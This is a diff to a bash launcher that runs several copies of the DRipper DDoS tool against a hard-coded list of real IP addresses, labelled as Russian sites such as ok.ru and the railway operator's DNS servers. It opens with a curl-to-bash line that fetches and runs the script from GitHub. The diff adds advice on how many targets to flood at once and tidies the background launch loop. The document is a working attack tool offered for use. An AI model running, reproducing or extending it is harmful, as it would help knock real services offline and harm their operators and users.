@@ -2,9 +2,13 @@
 # >>>   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_main | bash   <<<
 
 ##### To kill script CTRL+C will not be sufficient.
-##### Open other terminal and run 'pkill -9 python3'. Then press CTRL+C in terminal where DRipper was launched.
+##### Open other terminal and run 'pkill -f DRipper.py'. Then press CTRL+C in terminal where DRipper was launched.
 
 #!/bin/bash
+#How many copies of DRipper would be launched
+#Low number is counter-productive because some sites might be already down, so script won't do any work
+#Somewhere beetween 4 and 8 targets are good starting point.
+#With high number of targets output will be messy because all instances of DRipper use same terminal
 num_of_targets_to_attack=4
 
 declare -a targets
@@ -19,27 +23,22 @@ targets[6]="5.61.23.11 80 tcp"           #ok.ru
 targets[7]="195.208.109.58 80 tcp"       ##acs.vendorcert.mirconnect.ru
 targets[8]="195.208.109.58 443 tcp"      #acs.vendorcert.mirconnect.ru
 targets[9]="217.175.155.100 53 udp"      #DNS'ки РЖД.ру
-targets[10]="217.175.155.12 53 udp"       #DNS'ки РЖД.ру
+targets[10]="217.175.155.12 53 udp"      #DNS'ки РЖД.ру
 targets[11]="217.175.140.71 53 udp"      #DNS'ки РЖД.ру
 ################################################################
 list_size=${#targets[*]}
 
-echo "number of targets in list: " $number_of_targets
-
-# Get random number(s) to choose random targets from array "targets"
+# Get N(num_of_targets_to_attack) random numbers to choose random targets from array "targets"
 random_numbers=$(shuf -i 1-$list_size -n $num_of_targets_to_attack)
 
-# Launch several copies of DRipper. All output will run in single terminal so will be slightly messy.
+# Launch several copies of DRipper.
 for i in $(seq 1 $num_of_targets_to_attack)
 do
-             # Get address, port and protocol from choosen target site
+             # Get address, port and protocol from choosen target
              addr=$(echo ${targets[i]} | awk '{print $1}')
              port=$(echo ${targets[i]} | awk '{print $2}')
              prot=$(echo ${targets[i]} | awk '{print $3}')
-             
-             echo $addr $port $prot
-             sleep 1
             
-             # Launch DRipper to attack site choosen above
+             # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
 done
